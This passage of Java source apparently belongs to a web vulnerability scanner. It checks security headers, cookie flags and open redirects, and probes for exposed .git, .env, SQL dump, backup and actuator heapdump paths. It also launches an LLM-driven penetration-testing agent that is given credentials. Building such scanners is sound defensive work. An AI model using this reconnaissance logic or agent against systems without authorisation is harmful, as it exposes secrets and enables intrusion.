            return new PageFetch(0, Collections.emptyMap(), "", "", e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void checkSecurityHeaders(Map<String, List<String>> headers, String url, List<VulnFinding> findings) {
        Map<String, String> required = Map.of(
            "Content-Security-Policy", "CSP",
            "X-Frame-Options", "X-Frame-Options",
            "X-Content-Type-Options", "X-Content-Type-Options",
            "Strict-Transport-Security", "HSTS"
        );
        for (Map.Entry<String, String> entry : required.entrySet()) {
            if (!containsHeader(headers, entry.getKey())) {
                findings.add(new VulnFinding(null, "MEDIUM", "缺少安全响应头", url, "缺少 " + entry.getValue() + " 响应头", "添加 " + entry.getKey() + " 响应头以增强安全性"));
            }
        }
        for (String server : headerValues(headers, "Server")) {
            if (server != null && !server.isBlank()) {
                findings.add(new VulnFinding(null, "LOW", "信息泄露", url, "Server 响应头泄露服务器信息: " + server, "移除或隐藏 Server 响应头"));
            }
        }
        if (!headerValues(headers, "X-Powered-By").isEmpty()) {
            findings.add(new VulnFinding(null, "LOW", "信息泄露", url, "X-Powered-By 响应头泄露技术栈信息", "移除 X-Powered-By 响应头"));
        }
    }

    private void checkCookieSecurity(Map<String, List<String>> headers, String url, List<VulnFinding> findings) {
        for (String cookie : headerValues(headers, "Set-Cookie")) {
            String lower = cookie.toLowerCase(Locale.ROOT);
            boolean sessionLike = lower.contains("session") || lower.contains("token") || lower.contains("jwt") || lower.contains("remember") || lower.contains("auth");
            if (sessionLike && !lower.contains("httponly")) {
                findings.add(new VulnFinding(null, "MEDIUM", "Cookie 缺少 HttpOnly", url, "认证相关 Cookie 未设置 HttpOnly，XSS 后可能被脚本读取", "为会话 Cookie 增加 HttpOnly 属性"));
            }
            if (url.startsWith("https://") && sessionLike && !lower.contains("secure")) {
                findings.add(new VulnFinding(null, "MEDIUM", "Cookie 缺少 Secure", url, "HTTPS 站点认证 Cookie 未设置 Secure", "为会话 Cookie 增加 Secure 属性"));
            }
            if (sessionLike && !lower.contains("samesite")) {
                findings.add(new VulnFinding(null, "LOW", "Cookie 缺少 SameSite", url, "认证相关 Cookie 未设置 SameSite，CSRF 风险更高", "设置 SameSite=Lax 或 Strict"));
            }
        }
    }

    private void checkOpenRedirect(String targetUrl, String location, List<VulnFinding> findings) {
        if (REDIRECT_PARAM.matcher(targetUrl).find()) {
            findings.add(new VulnFinding(null, "HIGH", "开放重定向", targetUrl, "URL 包含重定向参数，可能被用于钓鱼攻击", "对重定向目标做白名单校验"));
        }
    }

    private boolean looksExposedSensitivePath(String path, PageFetch page) {
        if (isAccessDenied(page)) return false;
        String body = page.body == null ? "" : page.body.toLowerCase(Locale.ROOT);
        String contentType = page.contentType == null ? "" : page.contentType.toLowerCase(Locale.ROOT);
        if (path.contains(".git")) return body.contains("[core]") || body.contains("repositoryformatversion");
        if (path.endsWith(".env")) return body.contains("=") && (body.contains("password") || body.contains("secret") || body.contains("key"));
        if (path.endsWith(".sql")) return body.contains("create table") || body.contains("insert into") || body.contains("mysqldump");
        if (path.endsWith(".zip") || path.endsWith(".gz")) return contentType.contains("zip") || contentType.contains("octet-stream") || page.body.length() > 100;
        if (path.contains("swagger") || path.contains("api-docs")) return body.contains("openapi") || body.contains("swagger") || body.contains("api");
        if (path.contains("actuator")) return body.contains("propertysources") || body.contains("heapdump") || body.contains("profiles");
        return page.body.length() > 20;
    }

    private boolean isAccessDenied(PageFetch page) {
        if (page.status == 401 || page.status == 403) return true;
        String body = page.body == null ? "" : page.body.toLowerCase(Locale.ROOT);
        return body.contains("\"code\":401") || body.contains("\"code\": 401")
            || body.contains("认证失败") || body.contains("无法访问系统资源")
            || body.contains("unauthorized") || body.contains("forbidden");
    }

    private String severityForSensitivePath(String path) {
        if (path.contains(".env") || path.contains(".git") || path.endsWith(".sql") || path.contains("heapdump")) return "CRITICAL";
        if (path.contains("actuator") || path.contains("backup") || path.contains("dump")) return "HIGH";
        return "MEDIUM";
    }

    private URI normalizeTargetUri(String targetUrl) {
        String normalized = targetUrl.matches("(?i)^https?://.*") ? targetUrl : "https://" + targetUrl;
        URI uri = URI.create(normalized).normalize();
        if (!"http".equalsIgnoreCase(uri.getScheme()) && !"https".equalsIgnoreCase(uri.getScheme())) {
            throw new IllegalArgumentException("URL must start with http or https");
        }
        if (uri.getHost() == null || uri.getHost().isBlank()) {
            throw new IllegalArgumentException("URL host is required");
        }
        return uri;
    }

    private static Map<String, String> queryParams(URI uri) {
        if (uri.getRawQuery() == null || uri.getRawQuery().isBlank()) return Collections.emptyMap();
        Map<String, String> params = new LinkedHashMap<>();
        for (String pair : uri.getRawQuery().split("&")) {
            int idx = pair.indexOf('=');
            String key = idx >= 0 ? pair.substring(0, idx) : pair;
            String value = idx >= 0 ? pair.substring(idx + 1) : "";
            if (!key.isBlank()) params.put(key, value);
        }
        return params;
    }

    private static URI replaceQueryParam(URI uri, String paramName, String payload) {
        try {
            Map<String, String> params = new LinkedHashMap<>(queryParams(uri));
            params.put(paramName, java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8));
            StringBuilder query = new StringBuilder();
            for (Map.Entry<String, String> entry : params.entrySet()) {
                if (query.length() > 0) query.append('&');
                query.append(entry.getKey()).append('=').append(entry.getValue());
            }
            return new URI(uri.getScheme(), uri.getAuthority(), uri.getPath(), query.toString(), null);
        } catch (Exception ignored) {
            return null;
        }
    }

    private static boolean isSourceFile(Path path) {
        String n = path.getFileName().toString().toLowerCase(Locale.ROOT);
        return n.endsWith(".java") || n.endsWith(".kt") || n.endsWith(".py")
            || n.endsWith(".js") || n.endsWith(".ts") || n.endsWith(".tsx")
            || n.endsWith(".jsx") || n.endsWith(".go") || n.endsWith(".rs")
            || n.endsWith(".php") || n.endsWith(".rb") || n.endsWith(".cs")
            || n.endsWith(".c") || n.endsWith(".cpp") || n.endsWith(".h")
            || n.endsWith(".swift") || n.endsWith(".xml") || n.endsWith(".yml")
            || n.endsWith(".yaml") || n.endsWith(".properties")
            || n.endsWith(".conf") || n.endsWith(".cfg") || n.endsWith(".ini")
            || n.endsWith(".env") || n.endsWith(".sql") || n.endsWith(".sh")
            || n.endsWith(".bat") || n.endsWith(".ps1") || n.endsWith(".vue")
            || n.endsWith(".html") || n.endsWith(".jsp") || n.endsWith(".asp");
    }

    private static List<URI> extractLinks(String html, URI pageUri) {
        List<URI> links = new ArrayList<>();
        Matcher matcher = LINK.matcher(html);
        while (matcher.find() && links.size() < 80) {
            URI resolved = resolveUrl(pageUri, matcher.group(1));
            if (resolved != null && ("http".equalsIgnoreCase(resolved.getScheme()) || "https".equalsIgnoreCase(resolved.getScheme()))) {
                links.add(resolved);
            }
        }
        return links;
    }

    private static URI resolveUrl(URI pageUri, String raw) {
        if (raw == null || raw.isBlank()) return null;
        String trimmed = raw.trim();
        if (trimmed.startsWith("mailto:") || trimmed.startsWith("tel:") || trimmed.startsWith("javascript:") || trimmed.startsWith("data:")) return null;
        try {
            return pageUri.resolve(trimmed).normalize();
        } catch (Exception ignored) {
            return null;
        }
    }

    private static URI stripFragment(URI uri) {
        try {
            return new URI(uri.getScheme(), uri.getAuthority(), uri.getPath(), uri.getQuery(), null);
        } catch (Exception ignored) {
            return uri;
        }
    }

    private static boolean isSameOrigin(URI base, URI candidate) {
        return base.getScheme().equalsIgnoreCase(candidate.getScheme())
            && base.getHost().equalsIgnoreCase(candidate.getHost())
            && effectivePort(base) == effectivePort(candidate);
    }

    private static int effectivePort(URI uri) {
        if (uri.getPort() > 0) return uri.getPort();
        return "https".equalsIgnoreCase(uri.getScheme()) ? 443 : 80;
    }

    private static boolean isIpv4(String host) {
        if (host == null || !IPV4.matcher(host).matches()) return false;
        String[] parts = host.split("\\.");
        for (String part : parts) {
            try {
                int value = Integer.parseInt(part);
                if (value < 0 || value > 255) return false;
            } catch (Exception ignored) {
                return false;
            }
        }
        return true;
    }

    private static boolean isPublicIpv4(String host) {
        try {
            InetAddress address = InetAddress.getByName(host);
            if (address.isAnyLocalAddress() || address.isLoopbackAddress() || address.isLinkLocalAddress()
                || address.isSiteLocalAddress() || address.isMulticastAddress()) {
                return false;
            }
            byte[] b = address.getAddress();
            int first = b[0] & 0xff;
            int second = b[1] & 0xff;
            if (first == 0 || first == 10 || first == 127 || first >= 224) return false;
            if (first == 100 && second >= 64 && second <= 127) return false;
            if (first == 169 && second == 254) return false;
            if (first == 172 && second >= 16 && second <= 31) return false;
            if (first == 192 && second == 168) return false;
            if (first == 198 && (second == 18 || second == 19)) return false;
            return !(first == 203 && second == 0) && !(first == 192 && second == 0) && !(first == 192 && second == 2);
        } catch (Exception ignored) {
            return false;
        }
    }

    private static boolean isHtml(String contentType) {
        return contentType != null && contentType.toLowerCase(Locale.ROOT).contains("text/html");
    }

    private static boolean isTextContent(String contentType) {
        if (contentType == null) return false;
        String lower = contentType.toLowerCase(Locale.ROOT);
        return lower.contains("text/") || lower.contains("json") || lower.contains("xml")
            || lower.contains("javascript") || lower.contains("x-www-form-urlencoded");
    }

    private static boolean isApiContent(String contentType) {
        if (contentType == null) return false;
        String lower = contentType.toLowerCase(Locale.ROOT);
        return lower.contains("json") || lower.contains("xml") || lower.contains("x-www-form-urlencoded");
    }

    private static boolean isApiPath(String path) {
        if (path == null) return false;
        return path.contains("/api") || path.contains("/v1/") || path.contains("/v2/")
            || path.contains("/auth/") || path.contains("/token") || path.contains("/login")
            || path.contains("/oauth/") || path.contains("/graphql");
    }

    private static String readLimited(BufferedReader reader, int maxChars) throws java.io.IOException {
        if (reader == null) return "";
        StringBuilder content = new StringBuilder(Math.min(maxChars, 8192));
        char[] buffer = new char[4096];
        int read;
        while ((read = reader.read(buffer)) != -1 && content.length() < maxChars) {
            content.append(buffer, 0, Math.min(read, maxChars - content.length()));
        }
        return content.toString();
    }

    private static List<String> headerValues(Map<String, List<String>> headers, String name) {
        if (headers == null || name == null) return Collections.emptyList();
        for (Map.Entry<String, List<String>> entry : headers.entrySet()) {
            if (entry.getKey() != null && entry.getKey().equalsIgnoreCase(name)) {
                return entry.getValue() == null ? Collections.emptyList() : entry.getValue();
            }
        }
        return Collections.emptyList();
    }

    private static boolean containsHeader(Map<String, List<String>> headers, String name) {
        return !headerValues(headers, name).isEmpty();
    }

    private static String firstHeader(Map<String, List<String>> headers, String name) {
        List<String> values = headerValues(headers, name);
        return values.isEmpty() ? null : values.get(0);
    }

    private static String matchAttr(Pattern pattern, String text, String fallback) {
        Matcher matcher = pattern.matcher(text);
        return matcher.find() ? matcher.group(1).trim() : fallback;
    }

    private static boolean containsCsrfToken(String html) {
        String lower = html.toLowerCase(Locale.ROOT);
        return lower.contains("csrf") || lower.contains("_token") || lower.contains("authenticity_token") || lower.contains("xsrf");
    }

    private static boolean containsPasswordInput(String html) {
        String lower = html.toLowerCase(Locale.ROOT);
        return lower.contains("type=\"password\"") || lower.contains("type='password'");
    }

    private static void dedupeFindings(List<VulnFinding> findings) {
        Map<String, VulnFinding> unique = new LinkedHashMap<>();
        for (VulnFinding finding : findings) {
            String key = finding.getSeverity() + "|" + finding.getType() + "|" + finding.getLocation() + "|" + truncate(finding.getDescription(), 120);
            unique.putIfAbsent(key, finding);
        }
        findings.clear();
        findings.addAll(unique.values());
    }

    private static String truncate(String s, int maxLen) {
        if (s == null) return "";
        return s.length() <= maxLen ? s : s.substring(0, maxLen) + "...";
    }

    private static class Rule {
        final String type;
        final String severity;
        final String defaultDescription;
        final String defaultSuggestion;
        final List<Pattern> patterns;

        Rule(String type, String severity, String defaultDescription, String defaultSuggestion, String... regexes) {
            this.type = type;
            this.severity = severity;
            this.defaultDescription = defaultDescription;
            this.defaultSuggestion = defaultSuggestion;
            this.patterns = Arrays.stream(regexes).map(Pattern::compile).toList();
        }
    }

    private static class UrlScanOptions {
        final Map<String, String> headers;
        final String profile;
        final String customPaths;
        final int maxDepth;
        final int maxPages;
        final boolean portScanEnabled;
        final String portSpec;

        private UrlScanOptions(Map<String, String> headers, String profile, String customPaths, int maxDepth, int maxPages,
                               boolean portScanEnabled, String portSpec) {
            this.headers = headers;
            this.profile = profile == null || profile.isBlank() ? "standard" : profile;
            this.customPaths = customPaths;
            this.maxDepth = Math.max(0, Math.min(maxDepth, 4));
            this.maxPages = Math.max(1, Math.min(maxPages, 80));
            this.portScanEnabled = portScanEnabled;
            this.portSpec = portSpec;
        }

        static UrlScanOptions of(Map<String, String> headers, String profile, String customPaths, Integer maxDepth, Integer maxPages,
                                 Boolean portScanEnabled, String portSpec) {
            int depth = maxDepth == null ? DEFAULT_MAX_DEPTH : maxDepth;
            int pages = maxPages == null ? DEFAULT_MAX_PAGES : maxPages;
            if ("quick".equalsIgnoreCase(profile)) {
                depth = Math.min(depth, 1);
                pages = Math.min(pages, 10);
            } else if ("deep".equalsIgnoreCase(profile)) {
                depth = Math.max(depth, 3);
                pages = Math.max(pages, 40);
            }
            return new UrlScanOptions(headers == null ? Collections.emptyMap() : headers, profile, customPaths, depth, pages,
                Boolean.TRUE.equals(portScanEnabled), portSpec);
        }

        String profileLabel() {
            if ("quick".equalsIgnoreCase(profile)) return "快速扫描";
            if ("deep".equalsIgnoreCase(profile)) return "深度扫描";
            return "标准扫描";
        }

        List<String> sensitivePaths() {
            List<String> paths = new ArrayList<>(BASE_SENSITIVE_PATHS);
            if ("deep".equalsIgnoreCase(profile)) {
                paths.addAll(Arrays.asList("/actuator", "/actuator/beans", "/actuator/configprops", "/metrics", "/.svn/entries", "/admin", "/console"));
            }
            if (customPaths != null && !customPaths.isBlank()) {
                for (String line : customPaths.split("\\r?\\n")) {
                    String path = line.trim();
                    if (!path.isBlank()) paths.add(path.startsWith("/") ? path : "/" + path);
                }
            }
            return paths.stream().distinct().toList();
        }
    }

    private static class JsonLoginBody {
        final String template;
        final String[] paramNames;

        JsonLoginBody(String template, String... paramNames) {
            this.template = template;
            this.paramNames = paramNames;
        }
    }

    private static class CrawlTarget {
        final URI uri;
        final int depth;

        CrawlTarget(URI uri, int depth) {
            this.uri = uri;
            this.depth = depth;
        }
    }

    private static class PageFetch {
        final int status;
        final Map<String, List<String>> headers;
        final String contentType;
        final String body;
        final String error;

        PageFetch(int status, Map<String, List<String>> headers, String contentType, String body, String error) {
            this.status = status;
            this.headers = headers == null ? Collections.emptyMap() : headers;
            this.contentType = contentType == null ? "" : contentType;
            this.body = body == null ? "" : body;
            this.error = error;
        }
    }

    // ---- Agent integration ----

    @Override
    public VulnScanJob scanUrlWithAgent(String targetUrl, Long userId, Long deptId,
                                         String modelType, Long modelId,
                                         List<CredentialState> agentCredentials) {
        VulnScanJob job = createJob("url", targetUrl, userId, deptId, modelType, modelId);
        jobMapper.insertVulnScanJob(job);

        VulnLlmVerifier llm = buildVerifier(deptId, userId, modelType, modelId);
        ScanProgress progress = new ScanProgress();
        UrlScanOptions options = UrlScanOptions.of(null, "standard", null, null, null, null, null);
        List<VulnFinding> findings = doUrlScan(targetUrl, options, progress, llm);
        List<String> messages = new ArrayList<>();

        CompletableFuture<List<VulnFinding>> agentFuture = launchAgentIfConfigured(
            targetUrl, llm, agentCredentials, messages);

        try {
            List<VulnFinding> agentFindings = agentFuture.get(5, TimeUnit.MINUTES);
            if (agentFindings != null && !agentFindings.isEmpty()) {
                findings.addAll(agentFindings);
            }
        } catch (Exception e) {
            log.warn("Agent scan incomplete: {}", e.getMessage());
        }

        saveFindings(job.getId(), findings);
        updateJobCounts(job, findings);
        job.setFindings(findings);
        return job;
    }

    private CompletableFuture<List<VulnFinding>> launchAgentIfConfigured(
            String targetUrl, VulnLlmVerifier llm,
            List<CredentialState> agentCredentials,
            List<String> progressMessages) {
        if (llm == null) {
            log.info("Agent skipped: no LLM configured");
            return CompletableFuture.completedFuture(List.of());
        }

        PenTestAgent agent = new PenTestAgent(
            targetUrl,
            llm.getBaseUrl(),
            llm.getModel(),
            llm.getApiKey(),
            50,
            Duration.ofMinutes(55),
            msg -> {
                log.info("[Agent] {}", msg);
                if (progressMessages != null) progressMessages.add(msg);
            }
        );

        if (agentCredentials != null && !agentCredentials.isEmpty()) {
            agent.loadCredentials(agentCredentials);
        }

        return CompletableFuture.supplyAsync(() -> agent.run());
    }
}
